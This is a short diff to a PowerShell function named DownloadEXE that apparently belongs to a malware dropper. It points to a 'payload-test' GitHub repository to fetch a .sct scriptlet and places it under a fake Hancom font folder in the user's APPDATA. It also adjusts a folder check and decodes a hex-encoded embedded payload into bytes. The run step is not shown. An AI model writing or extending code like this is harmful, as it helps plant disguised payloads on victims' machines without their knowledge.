@@ -4,7 +4,7 @@ function DownloadEXE {
     $outFile2 = "$env:APPDATA\HNC\User\Fonts\Hncobj.sct"
     $Url = "https://github.com/zxz3650/payload-test/raw/master/Hncobj.sct"
 
-    if (-not (Test-Path -Path $outFile)) {
+    if (-not (Test-Path -Path "$env:APPDATA\HNC\")) {
         New-Item -ItemType Directory -Path "$env:APPDATA\HNC"
     }
 	$bytes = -split ($payload -replace '..', '0x$& ') | ForEach-Object { [System.Convert]::ToByte($_, 16) }
